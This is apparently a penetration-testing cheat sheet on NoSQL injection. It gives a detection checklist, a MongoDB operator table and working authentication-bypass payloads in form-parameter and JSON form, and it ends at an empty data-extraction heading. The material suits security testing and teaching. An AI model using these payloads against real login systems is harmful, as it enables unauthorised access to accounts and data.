
# NoSQL Injection
> NoSQL injection occurs when user input is passed into a NoSQL query without being properly sanitized, allowing an attack to control the query with forcing the server to carry out unintended actions.
>* There are four types:
>	* In-Band
>	* Blind
>	* Boolean
>	* Time-Based

## Basic Checklist
- [ ] Enumerate if target web app is using NoSQL
	- [ ] JSON documents with nested objects/arrays in response
	- [ ] `_id` in response
	- [ ] Long hex strings
	- [ ] Firebase/Firestore SDKs
- [ ] Attempt to bypass the authentication screen

| Operator | Description        |
| -------- | ------------------ |
| `$ne`    | not equal          |
| `$regex` | regular expression |
| `gt`     | greater than       |
| `$lt`    | lower than         |
| `$nin`   | not in             |
 

## How To Test
### Authentication Bypass
>PHP and MongoDB
> * For PHP apps, when passing a form such as `password[$ne]=1`, PHP will turn it into an array `password: {$ne: 1}`
* HTTP Data
```bash
email[$ne]=test@test.com&password[$ne]=test
email[$regex]=.*&password[$ne]=.*
email[$gt]=&password[$gt]=
```

* JSON Data
```js
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### In-Band Data Extraction
